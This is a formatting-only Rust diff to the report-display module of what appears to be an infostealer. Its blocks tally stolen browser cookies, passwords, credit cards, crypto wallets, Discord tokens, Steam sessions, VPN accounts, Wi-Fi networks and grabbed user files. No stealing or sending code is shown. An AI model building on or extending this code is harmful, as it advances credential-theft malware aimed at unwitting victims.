@@ -44,7 +44,7 @@ pub struct CollectorBlock {
     #[new(into)]
     pub name: Arc<str>,
     #[new(into)]
-    pub fields: Arc<[CollectorField]>
+    pub fields: Arc<[CollectorField]>,
 }
 
 pub(crate) trait DisplayBuilder {
@@ -81,57 +81,69 @@ struct DeviceDisplay<'a, T: Device>(&'a T);
 impl<'a, T: Browser> DisplayBuilder for BrowserDisplay<'a, T> {
     fn build_block(&self) -> CollectorBlock {
         let browser = self.0;
-        collector_block!("🔍", "Browser Data", [
-            ("🍪", "Cookies", browser.get_cookies()),
-            ("🔐", "Passwords", browser.get_passwords()),
-            ("💳", "Credit Cards", browser.get_credit_cards()),
-            ("✍️", "Autofills", browser.get_auto_fills()),
-            ("🕘", "History", browser.get_history()),
-            ("📑", "Bookmarks", browser.get_downloads()),
-            ("⬇️", "Downloads", browser.get_bookmarks()),
-        ])
+        collector_block!(
+            "🔍",
+            "Browser Data",
+            [
+                ("🍪", "Cookies", browser.get_cookies()),
+                ("🔐", "Passwords", browser.get_passwords()),
+                ("💳", "Credit Cards", browser.get_credit_cards()),
+                ("✍️", "Autofills", browser.get_auto_fills()),
+                ("🕘", "History", browser.get_history()),
+                ("📑", "Bookmarks", browser.get_downloads()),
+                ("⬇️", "Downloads", browser.get_bookmarks()),
+            ]
+        )
     }
 }
 
-impl<'a, T: Software> DisplayBuilder for SoftwareDisplay<'a, T>  {
+impl<'a, T: Software> DisplayBuilder for SoftwareDisplay<'a, T> {
     fn build_block(&self) -> CollectorBlock {
         let software = self.0;
-        collector_block!("💻", "Installed Software", [
-            ("👛", "Wallets", software.get_wallets()),
-            ("📁", "FTP Hosts", software.get_ftp_hosts()),
-            ("📲", "Telegram", EmojiBoolean(software.is_telegram())),
-            ("🎮", "Discord Tokens", software.get_discord_tokens()),
-            ("🕹️", "Steam Sessions", software.get_steam_session()),
-        ])
+        collector_block!(
+            "💻",
+            "Installed Software",
+            [
+                ("👛", "Wallets", software.get_wallets()),
+                ("📁", "FTP Hosts", software.get_ftp_hosts()),
+                ("📲", "Telegram", EmojiBoolean(software.is_telegram())),
+                ("🎮", "Discord Tokens", software.get_discord_tokens()),
+                ("🕹️", "Steam Sessions", software.get_steam_session()),
+            ]
+        )
     }
 }
 
-impl<'a, T: FileGrabber> DisplayBuilder for FileGrabberDisplay<'a, T>  {
+impl<'a, T: FileGrabber> DisplayBuilder for FileGrabberDisplay<'a, T> {
     fn build_block(&self) -> CollectorBlock {
         let file_grabber = self.0;
-        collector_block!("📂", "User Files", [
-            ("🧑‍💻", "Source Code", file_grabber.get_source_code_files()),
-            ("🗃️", "Databases", file_grabber.get_database_files()),
-            ("📄", "Documents", file_grabber.get_documents()),
-        ])
+        collector_block!(
+            "📂",
+            "User Files",
+            [
+                ("🧑‍💻", "Source Code", file_grabber.get_source_code_files()),
+                ("🗃️", "Databases", file_grabber.get_database_files()),
+                ("📄", "Documents", file_grabber.get_documents()),
+            ]
+        )
     }
 }
 
-impl<'a, T: Vpn> DisplayBuilder for VpnDisplay<'a, T>  {
+impl<'a, T: Vpn> DisplayBuilder for VpnDisplay<'a, T> {
     fn build_block(&self) -> CollectorBlock {
         let vpn = self.0;
-        collector_block!("🌐", "VPN", [
-            ("🔐", "Accounts", vpn.get_accounts()),
-        ])
+        collector_block!("🌐", "VPN", [("🔐", "Accounts", vpn.get_accounts()),])
     }
 }
 
-impl<'a, T: Device> DisplayBuilder for DeviceDisplay<'a, T>  {
+impl<'a, T: Device> DisplayBuilder for DeviceDisplay<'a, T> {
     fn build_block(&self) -> CollectorBlock {
         let vpn = self.0;
-        collector_block!("📶", "Device Data", [
-            ("📡", "Wi-Fi Networks", vpn.get_wifi_networks()),
-        ])
+        collector_block!(
+            "📶",
+            "Device Data",
+            [("📡", "Wi-Fi Networks", vpn.get_wifi_networks()),]
+        )
     }
 }
 
